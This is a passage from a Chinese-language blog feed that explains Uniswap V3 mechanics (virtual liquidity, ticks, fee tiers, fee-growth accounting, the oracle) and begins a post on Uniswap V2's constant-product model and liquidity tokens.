alt="image-20230804084900501"></p><p>但是如果模型搞成这样，就不是反比例了，和V2的模型就不一样。为了V3和V2普通用户进行交易的时候体验相同，V3引入虚拟流动性的概念：将上图的曲线进行平移抬升，恢复到V2的模型，效果下图。注意：我们这样平移对价格没有影响，前提是价格没有超过限定的区间。</p><p><img src="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/image-20230804085619950.png" alt="image-20230804085619950"></p><ul><li><p>特点</p><ul><li><p>在 Uniswap V3 中，允许用户在提供流动性时，可以自定义该流动性所支持的价格区间，仅当交易价格处于指定的交易区间内时，提供的头寸（position：集中到一个有限区间的流动性）才会被激活，V3 会注入虚拟流动性来保持公式的计算一致性，使曲线从橙色曲线拉抬成了青色曲线，用户才能够分得手续费。注意， <code>x_virtual</code>, <code>y_virtual</code> 并不会参与真实的交易</p></li><li><p>当流动池的价格来到用户设置的零界点时（例如图中的 a 点或者 b 点），用户实际提供的 x token 或者 y token 将为 0，x 或 y 将完全由虚拟 token 组成。为了保证虚拟 token 恒定不变，当价格进一步变动，移动到用户设定的价格区间之外时，流动池会移除这部分流动性，以保证虚拟的 x token 或 y token 数量不会减少，因此这部分虚拟的 token 只会在价格处于设定的区间内时参与价格的计算，而不会真的参与流动性提供（即虚拟 token 数为常数，并不会发生数量变化）。例如，当价格到达 a 点时，用户的所有资金转换为 x，此时Yreal=0, y=Yv，当价格继续降低时，流动池将移除这部分流动性。用户的资金状态将停留在 a 点，直至价格再次回到 a 点并进入 a,b 价格区间。</p><p><img src="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/xyHTcRYY615111b570d8c.webp" alt="understanding04reserveschange.webp"></p></li></ul></li><li><p>市场</p><ul><li>如此一来，理想状态下，由于每个用户对币价的预期不同，大家都会选择自认为流动性较大的区间做市，提高了头寸的资金利用率，获得更多的手续费收益。当然，你设置的区间越小，在区间添加的流动性越多，得到的回报就更多，如何根据区间范围和流动性添加多少而进行分配手续费的规则很复杂，下面会另外说。可以类比炒股：只压其中一个股票=V3定义的区间很小，压很多钱到其中一个股票=V3流动性添加很多。</li><li>V3 的改变，相当于是给用户提供了一种高风险高回报的收益模式。当然，如果用户对市场趋势判断的信心不足，愿意降低收益的同时降低风险（类似买基金，不买股票），也可以将提供头寸的流动性区间手动设置为 (0, ∞) ，如此一来，风险收益模型就和 V2 没有区别了。</li></ul></li></ul><h3 id="公式推导"><a href="#公式推导" class="headerlink" title="公式推导"></a>公式推导</h3><p>有了这个解决方案，我们就来考虑如何用数学来实现它。公式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(x + x_virtual) * (y + y_virtual) = L^2</span><br><span class="line"></span><br><span class="line">注：由于后面的相关交易公式推导涉及到了开根号，所以为了方便计算，V3 使用了 L^2 来替代 k ，实质上两者是一样的（L^2 = k）。</span><br></pre></td></tr></table></figure><p>下图是公式的推导（1）和公式的例子（2）</p><p><img src="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/image-20230804104001946.png" alt="image-20230804104001946"></p><p>我们来研究一下：当价格大于、小于、位于范围区间时的Xreal与流动性的关系。</p><p><img src="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/image-20230804114623873.png" alt="image-20230804114623873"></p><h3 id="流动性聚合"><a href="#流动性聚合" class="headerlink" title="流动性聚合"></a>流动性聚合</h3><blockquote><p>问题摘要：</p><p>假如我设置流动性区间是100~200，有人设置区间110~200，此时价格为150，我们添加的流动性都可以获得手续费。<br>此时有人swap了1个ETH，那么我们可以来分这个手续费，它是怎么计算手续费分成给每个人的呢？<br>如果是以前V2，就很容易理解，个人份额占总份额。但是在V3，每个人在不同区间有份额，它怎么计算每个人应该分到多少呢？</p></blockquote><p>上面我们说了，通过引入虚拟 token 的概念，让用户可以在某一个价格区间内提供流动性。而每一个用户提供的流动性都可能设置不同的价格区间，这样一来一个交易对的池子中就包含了多个不同的流动性</p><p>因此从单个交易池的视角来看：Uniswap v3 实际上扮演的角色是一个交易聚合器：当发生交易时，此交易会拆分成多个，通过池中多个不同的流动性区间来进行交易，最后将交易结果聚合，完成最终的交易过程。</p><p>从交易聚合器的角度看：在交易发生前，池中每一个流动性区间中的 token price 是一致的（每一个区间是均匀分配流动性的）。那么我们需要让交易结束后，池中每一个流动性中的 token price 仍然是一致的（当然这里仅包含所有在区间内的流动性）。因此 v3 的交易过程会围绕价格来进行，这样可以保证所有流动性的价格一致。事实上这就和 AMM 交易聚合器的行为一致，因此我们可以把 Uniswap V3 理解成单个交易池中不同流动性的交易聚合器。</p><p>在实际交易过程中，一个交易会通过多个流动性聚合完成。因此下面的公式会进行聚合完成，即使用当前价格上的流动性总和来进行计算，也就是说 <code>整体流动性 = 各个用户的流动性聚合的结果</code></p><p><img src="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/image-20230804104158880.png" alt="image-20230804104158880"></p><p>同时，一个交易还可能跨越不同的流动性阶段（即可能超出或者进入某个流动性），因此合约需要维护每个用户提供流动性的价格边界，当价格到达边界时，需要在总流动性上增加或移除对应流动性大小，通过分段计算的方式完成交易结果的计算。</p><blockquote><p>在 V2 中代表用户提供了流动性的凭证是 ERC20 类型的 LP token （liquidity provider token），因为所有流动性都可以被认为是价格区间为 (0, ∞) 的流动性，因此可以用同质化代币流通。但 V3 中每个流动性可能价格区间都不同，因此需要用 ERC721 类型（NFT）的非同质化代币表示。</p></blockquote><p>注意：V3中是用ERC721来表示流动性的，而不是ERC20</p><h3 id="流动性计算"><a href="#流动性计算" class="headerlink" title="流动性计算"></a>流动性计算</h3><p>假设用户提供的流动性范围：[Pa, Pb]</p><ul><li>如果池子价格Pc &lt; Pa</li></ul><p><img src="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/image-20230805153249390.png" alt="image-20230805153249390"></p><ul><li>如果池子价格Pc &gt; Pa</li></ul><p><img src="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/image-20230805153314354.png" alt="image-20230805153314354"></p><ul><li>如果池子价格Pc位于你设置的价格区间内</li></ul><p><img src="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/image-20230805153336999.png" alt="image-20230805153336999"></p><h2 id="池子"><a href="#池子" class="headerlink" title="池子"></a>池子</h2><p>下面有三个模型：</p><ul><li>第一个：V2中的流动性是平摊到(0, ∞)</li><li>第二个：V3规定可以指定在某一个范围提供流动性，你注入的流动性在这个范围内均匀分布</li><li>第三个：一个交易对池子的流动性注入区间的情况累加而成。注意：如图只是举个例子，真实情况不一定就是正态分布</li></ul><p><img src="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/image-20230804205012995.png" alt="image-20230804205012995"></p><p>池子的交易过程如下图：假设我们的价格从低去往高处，于是就会从左向右穿过这些区间1、2、3，不断用一种资产换另外一种资产。如果价格区间的某种资产被消耗完了，就会进入下一个区间。在价格移动消耗池内资产数量的过程中，输入的资产数量也会不断减少，一旦在某个区间输入资产被耗尽，那么价格就会停留在该区间内。</p><p>停留在该区间具体什么位置，V3有自己的公式进行计算，它引入了tick的概念，通过tick的计算来确定价格停留在哪个具体位置。</p><p><img src="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/image-20230805121118910.png" alt="image-20230805121118910"></p><h2 id="tick"><a href="#tick" class="headerlink" title="tick"></a>tick</h2><ol><li><p>我们将价格轴划分为有限个离散的点，交易价格的区间边界只能定义在这些点<code>i</code>上面，这里的 <code>i</code> 也就是价格的序号，我们称之为 <code>tick</code>，而由所有序号组成的集合称之为 <code>Ticks</code>。在合约代码中，主要是以 <code>tick</code> 来记录流动性的区间。</p></li><li><p>tick的位置如何呢？</p><ul><li><p>按照等差数列间隔：solidity不支持小数，我们对这些等差元素进行编号，比如 0.0001 是 1 号， 0.0002 是 2 号…但是，因为 solidity 最大的整数是 <code>2^256</code>，大约在 <code>1.158e73</code> 的价格就到头了。并且不具备灵活性，只能0.0001。不可行。</p></li><li><p>按照等比数列间隔：问题和等差的差不多，价格范围小，不具备灵活性</p></li><li><p>按照等幂数列间隔</p><ul><li><p>i越小，波动越小，点与点之间的间隔越小，价格差越小；i越大，波动越大，点与点之间的间隔大，价格差越大。这就非常适合稳定币和波动大的山寨币了</p></li><li><p>i的类型是int24。i=0的时候，价格是1，是价格的基点。可以是负数，那就是在0~1之间波动，正数则逐步变大。</p></li><li><p>在 V3 中的价格是从 <code>(√1.0001)^(int24).min</code> 到 <code>(√1.0001)^(int24).max</code> ，这是一个足够宽广的价格区间，且满足交易中的精度要求。</p><p><img src="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/image-20230805123814270.png" alt="image-20230805123814270"></p></li></ul></li></ul></li></ol><h3 id="费率设计"><a href="#费率设计" class="headerlink" title="费率设计"></a>费率设计</h3><ul><li>我们知道 <code>tick</code> 越多，价格可选的值越精细，但是合约在计算时候的价格区间就可能越多，那么 gas 消耗也会更加的多，因此我们需要让 <code>tick</code> 的数量保持在一个合理的范围内。Uniswap 针对不同类型的代币对推荐使用不同类型的费率，引入了 <code>tickSpacing</code> 的概念，即每个 <code>tick</code> 之间跳过 N 个 <code>tick</code>。<ul><li>对于价格波动较小的交易池，我们希望 <code>tickSpacing</code> 更小，这样价格可选值更多，同时也希望费率更低。反之波动大的交易对，可以让 <code>tickSpacing</code> 更大，这样更节约 gas，但是我们希望它的费率更高。</li><li>对于每一种交易对而言，都有三档可选费率等级，0.05%, 0.3%, 1%，并且以后通过社区治理，还有可能永久增加可选的挡位。每种交易费率等级都由给定的 <code>tickspacing</code>，比如稳定币交易对，就是 <code>tick</code> 之间需要间隔 10 个才是有效的可使用的 tick 。位于间隔内的 <code>tick</code> 虽然存在，但程序不会去初始化和使用，也就不会产生 gas 费用。因此，我们在等幂数列的基础上，进一步节省了计算消耗。</li></ul></li></ul><p>V3 设定的费率等级：</p><div class="table-container"><table><thead><tr><th>费率</th><th>tickspacing</th><th>建议的使用范围</th></tr></thead><tbody><tr><td>0.05%</td><td>10</td><td>稳定币交易对</td></tr><tr><td>0.3%</td><td>60</td><td>适用大多数交易对</td></tr><tr><td>1%</td><td>200</td><td>波动极大的交易对</td></tr></tbody></table></div><h3 id="liquidityNet和liquidityGross"><a href="#liquidityNet和liquidityGross" class="headerlink" title="liquidityNet和liquidityGross"></a>liquidityNet和liquidityGross</h3><ul><li><p>定义</p><ul><li><p><code>liquidityGross</code>：如下图，当有流动性区间的边界设置为1、2、3点时，<code>liquidityGross</code> 都会增加。如果某个tick的<code>liquidityGross</code>为0，说明这个点没有激活，没有流动性</p></li><li><p><code>liquidityNet</code>：表示当价格穿过该 tick 时，处于激活的流动性需要变化的数量。如图，穿过1、2、3这些tick时，会根据这些tick上面的<code>liquidityNet</code>更新处于激活状态的流动性数量。在注入或移除数量为 <code>l</code> 的流动性时，具体规则如下：</p><ul><li>注入流动性，tick 是价格下限，<code>liquidityNet</code> 增加 <code>l</code></li><li>注入流动性，tick 是价格上限，<code>liquidityNet</code> 减少 <code>l</code></li><li>移除流动性，tick 是价格下限，<code>liquidityNet</code> 减少 <code>l</code></li><li>移除流动性，tick 是价格上限，<code>liquidityNet</code> 增加 <code>l</code></li></ul><p><img src="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/image-20230805124821938.png" alt="image-20230805124821938"></p></li></ul></li><li><p>例子</p><ul><li><p>liquidityGross</p><p><img src="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/image-20230805130121041.png" alt="image-20230805130121041"></p></li><li><p>liquidityNet</p></li></ul></li></ul><p><img src="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/image-20230805125636295.png" alt="image-20230805125636295"></p><h3 id="手续费"><a href="#手续费" class="headerlink" title="手续费"></a>手续费</h3><ul><li><p>分配手续费的标准：在任意区间内，根据出资比例和参与时长保证分配的公平性</p></li><li><p>方案1：直接累加手续费（淘汰）</p><ul><li>算法<ol><li>一笔交易开始，根据之前交易部分的过程描述，交易会在已有流动性的 tick 之间，逐个进行</li><li>当价格来到一个 tick (已有流动性的tick)，我们只要记录这个 tick 上的交易量，根据费率算出该区间的总手续费</li><li>然后找出所有包含该 tick 流动性头寸 <code>position</code>，先将他们的数量汇总</li><li>再根据出资比例逐个分配手续费，将数值累加到待每个头寸的待收取手续费的变量上</li></ol></li><li>缺点：十分消耗gas。原因：一笔交易可能会横跨很多个 tick ，单就一个 tick 的计算，就有可能涉及到非常多的流动性头寸 <code>position</code>，这不但需要一个耗时的遍历查找的过程，更严重的问题是，每个流动性头寸的待收取手续费肯定是一个 storage 变量，当我们去逐个写入新的数值的时候，gas 费用就起飞了。</li></ul></li><li><p>方案2：（pick）</p><ul><li><p>相同区间 position 之间的分配</p><ul><li><p>算法</p><ol><li><p>我们不去遍历，而是计算每单位流动性能够获取的手续费数量：<code>用户提供流动性的数量 * 每单位流动性的手续费 = 应得的手续费</code>。<code>每单位流动性的手续费 = 总手续费 / 总流动性</code>。</p></li><li><p>我们设置一个记录全局的每单位流动性赚取手续费的累计值 <code>feeGrowthGlobal</code> （注意有 growth，表示它是累计值）。</p><ul><li><p><code>feeGrowthGlobal</code>: 每当有交易发生，就会把每单位流动性赚取的手续费累加到该变量上，这是一个随时间推移单调递增的变量。（这个变量其实有两个，因为手续费的收取是两种资产分别收取的，所以累计的变量也对应了两个）</p></li><li><p><code>liquidity</code>: 池子当前处于激活状态的总流动性数量。</p></li></ul></li><li><p>再设置一个局部变量：<code>delta fee</code>: 交易过程中，每一步产生的手续费数量</p></li><li><p>我们只需要用 <code>delta fee</code> 除以 <code>liquidity</code> 就能得到 <code>feeGrowthGlobal</code> 每次需要增加的量。</p></li><li><p>只需要在流动性发生变化时，计算这段时间内 <code>feeGrowthGlobal</code> 的增量，再乘以该 <code>position</code> 的流动性数量，就可以知道这段时间内该 <code>position</code> 收取的手续费增量。</p></li><li><p>最后将 <code>position</code> 内手续费的增量累加起来就是它应得的数量。</p></li></ol></li><li><p>特点</p><ul><li>不需要遍历流动性数量算出流动性数量比例，而是去关注每单位收益的增量</li><li>在 <code>position</code> 流动性数量发生变化之前，需要将之前这段时间的手续费增量计算出来，累加记录到相关变量中</li><li>全局的 <code>feeGrowthGlobal</code> 是会随着交易进行实时更新的，而 <code>position</code> 中的手续费数量不会实时更新，只会在调用 mint 和 burn 这两个会改变流动性数量的函数时触发更新。</li></ul></li></ul></li><li><p>不同区间之间的分配</p><ul><li><p>算法</p><ol><li><p>计算区间外的手续费数量，用总手续费减去区间外的手续费数量，间接知道区间内的手续费</p><blockquote><p>假如交易在一个 (a,b) 的价格区间内进行，手续费会在区间内不断累加，但是区间外是一直不变的，即 (0, a) 和 (b, ∞) 区间内的手续费并没有增加。想要计算 (a,b) 区间内的手续费，其实只要用池子内所有流动性赚取的总手续费数量减去区间两边外侧的手续费就行了</p></blockquote><p><img src="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/image-20230805132058992.png" alt="image-20230805132058992"></p></li><li><p>公式：<code>feeGrowthInside = feeGrowthGlobal - feeGrowthOutsideBelow - feeGrowthOutsideAbove</code>。feeGrowthOutsideBelow 是红框的左侧，feeGrowthOutsideAbove是红框的右侧。</p></li><li><p>如果以某个 tick 作为中轴，价格点所在的一侧是内侧，而相对的另一侧是外侧。于是触发其更新的条件其实只有一个：当价格穿过该 tick 时（不论方向左右）。因为只有此时，tick 左右两侧会互换内侧和外侧的定义。</p></li></ol></li></ul></li><li><p>总流程</p><ol><li>记录池子内全局的每单位流动性收取手续费的数量的累加变量 <code>feeGrowthGlobal</code></li><li>在每个有流动性的 tick 上记录外侧的手续费数量 <code>feeGrowthOutside</code></li><li>对于任意区间，利用公式计算出区间内的手续费总量 <code>feeGrowthInside</code></li><li>该区间内会存在不同用户注入的不同流动性头寸 <code>position</code>，在 <code>position</code> 流动性数量发生变化时，累加距离上次变化到现在这段时间的手续费数量增量到 <code>tokensOwed</code> 变量（该 positioin 总共可回收的流动性数量）</li><li>用户收取手续费，从 <code>tokensOwed</code> 中扣除，其他变量不受影响。</li></ol></li></ul></li></ul><h3 id="辅助预言机的数据"><a href="#辅助预言机的数据" class="headerlink" title="辅助预言机的数据"></a>辅助预言机的数据</h3><div class="table-container"><table><thead><tr><th>Type</th><th>Variable Name</th><th>含义</th></tr></thead><tbody><tr><td>int128</td><td>liquidityNet</td><td>流动性数量净含量</td></tr><tr><td>int128</td><td>liquidityGross</td><td>流动性数量总量</td></tr><tr><td>int256</td><td>feeGrowthOutside0X128</td><td>以 token0 收取的 outside 的手续费总量</td></tr><tr><td>int256</td><td>feeGrowthOutside1X128</td><td>以 token1 收取的 outside 的手续费总量</td></tr><tr><td>int256</td><td>secondsOutside</td><td>价格在 outside 的总时间</td></tr><tr><td>int256</td><td>tickCumulativeOutside</td><td>价格在 outside 的 tick 序号累加</td></tr><tr><td>int256</td><td>secondsPerLiquidityOutsideX128</td><td>价格在 outside 的每单位流动性参与时长</td></tr></tbody></table></div><ol><li><code>secondsOutside</code>： 用池子创建以来的总时间减去价格区间两边 tick 上的该变量，就能得出该区间做市的总时长</li><li><code>tickCumulativeOutside</code>： 用预言机的 <code>tickCumulative</code> 减去价格区间两边 tick 上的该变量，除以做市时长，就能得出该区间平均的做市价格（tick 序号）</li><li><code>secondsPerLiquidityOutsideX128</code>： 用预言机的 <code>secondsPerLiquidityCumulative</code> 减去价格区间两边 tick 上的该变量，就是该区间内的每单位流动性的做市时长（使用该结果乘以你的流动性数量，得出你的流动性参与的做市时长，这个时长比上 1 的结果，就是你在该区间赚取的手续费比例）。</li></ol><h2 id="无常损失"><a href="#无常损失" class="headerlink" title="无常损失"></a>无常损失</h2><p>相同条件下，相同点，在V2和V3添加相同流动性的无常损失情况对比，可以看出，V3的无常损失比V2大</p><p><img src="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/image-20230804120846705.png" alt="image-20230804120846705"></p><p>V3无常损失移动的三种情况：移动到范围内、移动到大于范围、移动到小于范围，并且验证当范围无限大的时候是否变成V2：</p><p><img src="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/image-20230804143436562.png" alt="image-20230804143436562"></p><h2 id="限价单"><a href="#限价单" class="headerlink" title="限价单"></a>限价单</h2><p>当[a,b]区间足够小，即a,b足够接近时，可以在较短的时间内将X资产全部兑换为Y资产；通过做市的方式类似达到了限价单的功能，但是这个兑换只是暂时的，如果价格返回原点，Y资产会被兑换回X资产，所以需要流动性提供者在完成兑换后取出流动性。</p><p>其实区间范围大了也是一个道理，反正原理就是：当从一个价格移动向另外一个价格的时候，一种资产全部转变为另外一种资产。举个例子，我在[5,6]价格区间注入了5USDT和0DAI的流动性，然后价格从4去到了8，那么我注入的5USDT就会全部转变为n个DAI。过程类似下图：</p><p><img src="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/xyHTcRYY615111b570d8c-16912083763291.webp" alt="understanding04reserveschange.webp"></p><h2 id="预言机"><a href="#预言机" class="headerlink" title="预言机"></a>预言机</h2><h3 id="新旧对比"><a href="#新旧对比" class="headerlink" title="新旧对比"></a>新旧对比</h3><ul><li>V2 的预言机提供了 TWAP (time-weighted average price 时间加权平均价格)，更新时间是每个区块的第一笔交易的价格，其数值是上一次的数值加上当前价格乘以时间差。外部用户可以通过记录该数值的变化和时间点，获得在一段时间内受短期波动影响较小的时间加权价格。</li><li>V2 的预言机在核心合约上只保留最新的一个值，所以如果外部用户想要使用这个预言机，需要自己搭建一套监控和记录的设施，增加了使用者成本。</li></ul><p>V3 相比于 V2 的预言机，有以下较大改动：</p><ul><li>相比 V2 累加的是价格的加权数值，V3 累加的是价格的 log 值，即 <code>log(price, 1.0001)</code></li><li>在核心合约中增加了存储预言机数值的空间，最大 65536 个数值，至少 9 天的数值，建立监控和记录设施不再是必要条件</li><li>增加关于流动性的预言机数值，记录周期和价格一致（每个区块的第一笔交易），其值是当前激活状态的流动性数量的倒数，即 <code>1/liquidity</code></li></ul><h3 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h3><ul><li><p>V2 使用算术平均：记录价格的累加值，而使用时再除以时间间隔。而 V3使用几何平均： 累加<code>log(price, 1.0001)</code> ，也就是价格的幂，使用时再除以时间间隔</p></li><li><p>V3的公式</p><p><img src="/2023/08/06/03.Uniswap/08.uniswap_v3_theory/image-20230805133520291.png" alt="image-20230805133520291"></p><blockquote><p>这里的 log 数值后面其实还有一个 <code>* 1s</code> 即以每秒作为时间间隔。然而实际情况中，合约中是以区块的时间戳作为标记时间的，所以合约中的代码跟公式不同。每个区块的头一笔交易时更新，此时距离上一次更新时间间隔肯定大于 1s，所以需要将更新值乘以两个区块的时间戳的差。<code>tickCumulative</code> 是 tick 序号的累计值，tick 的序号就是 <code>log(√price, 1.0001)</code>。</p></blockquote></li><li><p>相比于 V2，任何时刻活跃的流动性就是池子内所有流动性数量总和（因为都是全价格区间），V3 有了不同价格区间，所以不同时刻，激活状态的流动性数量并不是池子内的总流动性数量。为了便于外部使用者更好的观测激活流动性的数量，V3 添加了预言机的 <code>secondsPerLiquidityCumulative</code> 变量。</p></li></ul><h2 id="风险与收益"><a href="#风险与收益" class="headerlink" title="风险与收益"></a>风险与收益</h2><ul><li>虽然V3的资产利用率更高，但V3的无常损失更大</li><li>由于添加流动性是指定一个区间，如果指定的区间太小导致价格不位于区间内，那么你添加的流动性不会被激活，因此赚不到任何手续费；但是如果区间太大比如设置为无穷，那就和V2没区别，资金利用率太低，导致手续费平摊到你手上的钱极少</li></ul><p>参考</p><ul><li><a href="https://mirror.xyz/0xCf19c7444b775f4fede9b7B53b4d708338004aa4/vC-wd8t-Z2cXdpV3jKQsagoGHrRNMRAp-LDPISQ71CA">https://mirror.xyz/0xCf19c7444b775f4fede9b7B53b4d708338004aa4/vC-wd8t-Z2cXdpV3jKQsagoGHrRNMRAp-LDPISQ71CA</a></li><li><a href="https://www.bilibili.com/video/BV1uq4y1N7o6/?vd_source=0cc0401ee122346d6680e90658b0ed1a">https://www.bilibili.com/video/BV1uq4y1N7o6/?vd_source=0cc0401ee122346d6680e90658b0ed1a</a></li><li><a href="https://www.learnblockchain.cn/article/3055">https://www.learnblockchain.cn/article/3055</a></li><li><a href="https://davidc.ai/2021/12/21/%E6%B5%85%E6%9E%90-Uniswap-V3/">https://davidc.ai/2021/12/21/%E6%B5%85%E6%9E%90-Uniswap-V3/</a></li><li><a href="https://mirror.xyz/adshao.eth/tgZjDXOtL999iuPjXWrolR7Ns1nTZDADA6NLJaJpJJM">https://mirror.xyz/adshao.eth/tgZjDXOtL999iuPjXWrolR7Ns1nTZDADA6NLJaJpJJM</a></li><li><a href="https://paco0x.org/uniswap-v3-1/">https://paco0x.org/uniswap-v3-1/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 03.Uniswap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>03.uniswap_v2_theory</title>
      <link href="/2023/08/05/03.Uniswap/03.uniswap_v2_theory/"/>
      <url>/2023/08/05/03.Uniswap/03.uniswap_v2_theory/</url>
      
        <content type="html"><![CDATA[<h1 id="uniswap-v2-theory"><a href="#uniswap-v2-theory" class="headerlink" title="uniswap_v2_theory"></a>uniswap_v2_theory</h1><h2 id="v1存在的问题"><a href="#v1存在的问题" class="headerlink" title="v1存在的问题"></a>v1存在的问题</h2><ol><li>不能直接创立两种ERC20代币的流动性池，只能创立ETH和ERC20代币的流动性池。这样两种ERC20代币就不能直接兑换，需要经过ETH转化，导致了当交易者需要将代币A换成代币B时，中间还需要买入卖出ETH并支付两笔交易费和gas费，成本高昂。</li><li>在实践的运行过程中，受制于以太坊吞吐量和速度的问题，Uniswap也遭遇过价格操作的状况。</li><li>刚开始起阶段，交易规模在整个加密世界还非常小，流动性深度不足，容易出现价格剧烈波动的情况。</li><li>也不能支持链式的兑换，例如：ETH-JCB-USDT-DAI </li><li>作为一个DEX，v1也没有提供价格预言的机制</li></ol><h2 id="V2架构"><a href="#V2架构" class="headerlink" title="V2架构"></a>V2架构</h2><p><img src="/2023/08/05/03.Uniswap/03.uniswap_v2_theory/image-20230503095441783.png" alt="image-20230503095441783"></p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li><p>支持任意ERC20代币的交易对，允许流动性提供者为任意两个ERC-20代币创建交易对合约。</p></li><li><p>提供价格预言机功能</p></li><li>提供闪电贷功能</li><li>不可升级</li><li>支持在工厂合约中修改一个变量，以便允许Uniswap协议针对每笔交易收取0.05%的手续费（即0.3%的1/6）。该手续费默认关闭，但是可以在未来被打开，在打开后流动性提供者将只能获取0.25%手续费，而非0.3%。【因为其中0.05%分给协议，关于0.05%协议手续费这个开关，后续引发了Sushiswap和Uniswap的流动性大战，Sushiswap fork Uniswap代码，<a href="https://docs.sushi.com/products/yield-farming/the-sushibar#what-is-xsushi">将0.05%协议手续费分给SUSHI持有者</a>，一度要将Uniswap流动性抢走；并最终迫使Uniswap发行了自己的代币UNI。】</li></ul><h2 id="k值"><a href="#k值" class="headerlink" title="k值"></a>k值</h2><h3 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h3><p><img src="/2023/08/05/03.Uniswap/03.uniswap_v2_theory/image-20230802133728347.png" alt="image-20230802133728347"></p><p><strong>考虑手续费</strong></p><p>设手续费为ρ，0≦ρ﹤1，γ=1-ρ。uniswap的手续费为0.3%</p><script type="math/tex; mode=display">XY=(X+\gamma \Delta X)(Y-\Delta Y)</script><script type="math/tex; mode=display">{\Delta X}={X\Delta Y \over {(Y - \Delta Y)}\gamma}</script><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><p>我们拿uniswap里的一个交易对，ETH/USDT来举例说明K值是怎么设计的。</p><ul><li><p>恒定乘积算法。</p><ul><li>uniswap里第一个人添加x个ETH和y个USDT的作为流动性时，决定了K值的初始大小，即K=x*y。</li></ul></li></ul><pre><code>- 这时，ETH和USDT共同构成了一个流动性池。- 第一个添加流动性的人，可以任意添加交易对中的两个币的数量，即可以任意决定K值。- 添加完流动性后，ETH的价格就等于=y(USDT的数量)/x(ETH的数量)。如果这个价格和其他交易所之间有价差，那肯定会被人搬砖套利。- 所谓的恒定乘积算法，指的是在流动性池没有再添加或减少流动性的情况下，只有交易行为发生的情况下，K值是不变的。即如果用户在ETH/USDT交易对里买入或卖出ETH，都无法改变K值的大小。- 而交易行为会修改流动性池里的ETH和USDT的成分。比如用户买了dx个ETH，则流动性池里的ETH的数量就会变成（x-dx），而usdt的数量则变成了K/(x-dx)，即用户需要花dy=K/(x-dx)-y个USDT来买dx个ETH。</code></pre><ul><li><p>添加流动性增加K值</p><ul><li>如果现在资金池里有xETH/yUSDT，K=x*y。现在有人又添加了流动性，增加了dx个ETH和dy个usdt，并且dx/dy=x/y。</li></ul></li></ul><ul><li>如果你使用Uniswap的默认设定，即你添加流动性时，先输入ETH的数量，然后uniswap会默认计算出需要多少USDT，这个默认计算就是保持dx/dy=x/y。</li><li>但，添加完流动性后，流动性池里的资金变成了：(x+dx)ETH/(y+dy)USDT。此时，(x+dx)<em>(y+dy)&gt;x</em>y。所以添加流动性K值变大了。</li></ul><ul><li><p>同样的减少流动性，会减少K值。</p></li><li><p>捐赠影响K值</p><ul><li>如果你在添加流动性时，不是按dx/dy=x/y的比例去添加，而是直接往合约地址里转了dx&gt;0，dy=0，也是可以的。这同样会改变K值。</li></ul></li></ul><pre><code>- 这样的事是经常发生的，有些人错误地将ETH转入一个uniswap流动性池合约地址里，就产生了捐赠行为，白白把币送给了所有原来的流动性所有者。- 这种非K值比例添加流动性的行为，被uniswap称为捐赠。</code></pre><ul><li>但这种捐赠行为，在设计上是可以被其他人套利的。比如有人充值了dx&gt;0，dy=0；此时另外的人可以充值按K值比例的dy，并且执行一个添加流动性的操作，就可以把那dx的捐赠给薅走。</li><li>任何不是按K值比例添加的流动性，都会产生捐赠。比如dx/dy&gt;x/y，则先添加(dx-ddx)/dy=x/y的流动性，并返回给用户对应数量的LPtoken。然后ddx就变成了捐赠。</li></ul><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>原本流动性池有5个tokenA和20个tokenB，所以X=5和Y= 20。</p><p>Tim拥有一个tokenA，当Tim换掉1个tokenA时，他会先支付0.3%的手续费，也就是0.003个tokenA (0.3%*1)。支付费用后，剩余的tokenA，也就是0.997 tokenA，会换成tokenB，所以新的X变成了5.997 tokenA。</p><p>由于K必须保持不变，新的Y可以从公式中计算出来X <em> Y= newX </em> newY。所以newY 是16.675004 (X <em> Y/newX = 5 </em> 20/ 5.997= 16.675004)。这意味着池中将持有16.675004个tokenB，剩余的tokenB将发送给Tim，这意味着Tim 将收到3.324996个tokenB (Y - newY = 20 -16.675004 = 3.324996)。</p><p>交换后，池中有5.997个tokenA和16.675004个tokenB。【不太对，因为手续费没加上去，K值应该是会稍微变大的】</p><p>在 Uniswap V2 中，手续费会留在池子里，而不是直接发送给流动性提供者。每次发生交易时，用户需要支付 0.3% 的手续费。这些费用会以增加储备量的形式添加到池子里。因此，手续费实际上是通过提高流动性池中的代币储备来间接奖励流动性提供者的。</p><p>当流动性提供者想要退出并赎回其份额时，他们可以获得池子中的代币，这时候就包括了那部分累积的手续费。换句话说，流动性提供者可以通过增加的储备量获得手续费收益，而这些增加的储备量正是由于交易产生的手续费。</p><h2 id="流动性"><a href="#流动性" class="headerlink" title="流动性"></a>流动性</h2><h3 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h3><ul><li>添加流动性：合约为流动性提供者铸造流动性代币。持有多少流动性代币，就表示为流动性池贡献了多少份额，也表示享有流动性池多少权益。</li><li>移除流动性：当他们取消做市的时候，把LP Token换成池子中的代币。由于用户买卖过程中需要手续费，手续费会放到池子中，最终给LP获得</li></ul><h3 id="公式-1"><a href="#公式-1" class="headerlink" 